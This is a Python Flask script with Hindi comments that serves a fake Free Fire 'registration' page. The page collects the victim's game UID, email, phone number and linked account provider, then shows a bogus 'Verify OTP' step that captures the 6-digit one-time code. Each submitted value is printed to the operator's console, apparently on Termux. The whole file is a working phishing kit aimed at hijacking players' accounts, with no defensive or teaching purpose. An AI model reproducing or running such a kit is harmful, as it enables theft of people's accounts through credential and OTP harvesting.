from Flask import Flask, request, render_template_string

app = Flask(__name__)

# यहाँ आपकी अपलोड की गई फोटो का लिंक है
BG_URL = "https://raw.githubusercontent.com/northway656-create/myflaskapp/main/22449.jpg"

HTML_TEMPLATE = f'''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {{
            background-image: url('{BG_URL}');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            margin: 0; font-family: sans-serif;
            display: flex; justify-content: center; align-items: center; height: 100vh;
        }}
        .form-box {{
            background: white; padding: 25px; border-radius: 15px;
            text-align: center; width: 320px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }}
        input, select {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }}
        button {{ background: #007bff; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; }}
    </style>
</head>
<body>
    <div class="form-box">
        <h2 style="color:#333;">💎 FF REGISTRATION 💎</h2>
        <form action="/submit" method="post">
            <input type="text" name="uid" placeholder="Free Fire UID" required>
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="text" name="phone" placeholder="Mobile Number" required>
            <select name="account">
                <option value="Google">Google Account</option>
                <option value="Facebook">Facebook Account</option>
                <option value="X (Twitter)">X (Twitter)</option>
                <option value="VK Account">VK Account</option>
            </select>
            <button type="submit">SEND 6-DIGIT OTP</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/submit', methods=['POST'])
def submit():
    # डेटा जो आपके Termux पर दिखेगा
    data = f"UID: {request.form.get('uid')} | Email: {request.form.get('email')} | Phone: {request.form.get('phone')} | Account: {request.form.get('account')}"
    print(f"\\n[!] NEW DATA: {data}\\n")
    
    return f'''
    <body style="text-align:center; padding-top:50px; font-family:sans-serif; background:white;">
        <h2>Verify OTP</h2>
        <p>6-Digit OTP sent to {request.form.get('phone')}</p>
        <form action="/final" method="post">
            <input type="text" name="otp" placeholder="Enter 6-Digit OTP" maxlength="6" required style="padding:10px; width:200px; text-align:center;"><br><br>
            <button type="submit" style="background:blue; color:white; padding:10px 30px; border:none; border-radius:5px;">VERIFY</button>
        </form>
    </body>
    '''

@app.route('/final', methods=['POST'])
def final():
    print(f"OTP RECEIVED: {request.form.get('otp')}")
    return "<h1>Registration Under Process!</h1>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
